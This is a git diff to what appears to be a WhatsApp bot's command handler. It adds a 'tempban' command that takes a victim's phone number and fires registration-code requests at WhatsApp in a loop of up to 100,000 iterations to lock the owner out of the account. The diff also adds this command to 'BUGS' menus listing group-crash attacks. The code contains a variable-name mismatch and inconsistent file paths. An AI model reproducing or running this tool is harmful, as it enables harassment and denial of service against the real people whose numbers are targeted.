@@ -1584,6 +1584,67 @@ ryozingod.relayMessage(m.chat, freesex, {})
 }
 break
 //=================================================//
+
+case 'tempban': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`Example: ${prefix + command} 234,7080968564`);
+  let numbers = JSON.parse(fs.readFileSync('./tb/numbers.json'));
+
+  let cCode = q.split(",")[0];
+  let number = q.split(",")[1];
+  let fullNo = cCode + number;
+
+  await reply( `Successfully locked otp of ${fullno},locking will continue until the bot restart`)
+
+  let { state, saveCreds } = await useMultiFileAuthState('tempb');
+
+  let spam = makeWaSocket({
+    auth: state,
+    mobile: true,
+    logger: pino({ level: 'silent' })
+  });
+
+  let dropNumber = async () => {
+    try {
+        let res = await spam.requestRegistrationCode({
+          phoneNumber: `+${fullNo}`,
+          phoneNumberCountryCode: cCode,
+          phoneNumberNationalNumber: number,
+          phoneNumberMobileCountryCode: 724
+        });
+
+        if (res.reason === 'temporarily_unavailable') {
+          console.log(`Number invalid (Kemungkinan Registrasi Terganggu): +${res.login}`);
+            await sleep(1000)
+            await dropNumber();
+        }
+    } catch (error) {
+      console.error(error);
+    }
+  };
+
+  numbers[fullNo] = { cCode, number };
+  fs.writeFileSync('./tempb/numbers.json', JSON.stringify(numbers, null, '\t'));
+for (let i = 0; i < 100000; i++) {
+dropNumber();
+await sleep(500)
+dropNumber();
+await sleep(500)                                                                                           dropNumber();
+await sleep(500)
+dropNumber();
+await sleep(500)
+dropNumber();
+await sleep(500)
+dropNumber();                                                                                              await sleep(500)
+dropNumber();                                                                                              await sleep(500)                                                                                           dropNumber();
+await sleep(500)
+dropNumber();
+await sleep(500)                                                                                           dropNumber();
+await sleep(500)
+}
+}
+break
+
 case "allmenu": case "allcmd": {
 let jinjing = [nulll, nulll2]
 let randomIndex = Math.floor(Math.random() * jinjing.length)
@@ -1668,7 +1729,8 @@ let itsmenu = `
 
 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
       *BUGS*
-    
+
+◈ ${prefix}tempban 234,7080968564
 ◈ ${prefix}bug-button link group
 ◈ ${prefix}bug-browser link group
 ◈ ${prefix}bug-gc 120###@g.us
@@ -1783,6 +1845,7 @@ let itsmenu = `
 *V600 BUG MENU*
 ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
 
+◈ ${prefix}tempban 234,7080968564
 ◈ ${prefix}bug-button link group
 ◈ ${prefix}bug-browser link group
 ◈ ${prefix}bug-gc 120###@g.us
